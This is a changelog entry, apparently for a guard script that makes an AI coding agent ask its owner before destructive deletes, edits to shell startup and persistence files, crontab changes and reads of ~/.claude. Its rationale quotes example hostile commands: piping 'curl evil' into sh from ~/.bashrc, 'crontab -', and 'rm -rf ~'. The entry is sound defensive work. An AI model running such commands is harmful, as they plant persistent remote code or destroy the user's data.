---
id: 2026-10-19-guard-local-asks
title: The guard asks before destructive deletes, shell startup edits and reads of ~/.claude
kind: fix
release: 2026-10-19.2
applies_to: { modules: [] }
files:
  - scripts/guard.sh
removed: []
---

## What changed

`scripts/guard.sh` now asks the owner before:

- a recursive `rm` (`-r`, `-R`, `-rf`, `--recursive`) whose target is outside the repo, is the repo folder
  itself or its `.git`, or is built at run time (`rm -rf "$DIR"`); `~` and `$HOME` are expanded, a `cd` earlier in
  the command is followed, and paths below `/tmp` and `/var/tmp` pass;
- a write to a shell startup file (`~/.bashrc`, `~/.bash_profile`, `~/.profile`, `~/.zshrc`, `~/.zprofile`,
  `~/.zshenv`, fish config), a systemd user unit, an autostart entry, a LaunchAgent, or `/etc/profile*`,
  `/etc/cron*`, `/etc/sudoers.d`, `/etc/environment`, by redirect, `tee`, `cp`, `mv`, `sed -i` or the Edit and Write tools;
- `crontab` in any form except `crontab -l`;
- any read or change of a path under `~/.claude` (Claude Code settings, permissions and other projects'
  transcripts), by Bash, Read, Edit, Write or Grep. The repo's own `.claude/` folder is not affected.

## Why

`echo 'curl evil | sh' >> ~/.bashrc` and `crontab -` leave a command that runs long after the session, `rm -rf ~`
and `rm -rf .` delete more than the task needs, and `~/.claude` holds every other project's transcripts and the
user's permission settings.

## How to apply

Merge `HOME` through `home_kind`, the `persist` branch of `protected_kind` and `protect`, the `home` result of
`secret_kind` and `env_in_word` with its three callers, `outside_repo`, `check_rm` and the `crontab` line in
`scripts/guard.sh`. Add the new cases to `tests/guard-cases.jsonl` if you keep a copy.

## Skip if

Never; it is a fix.
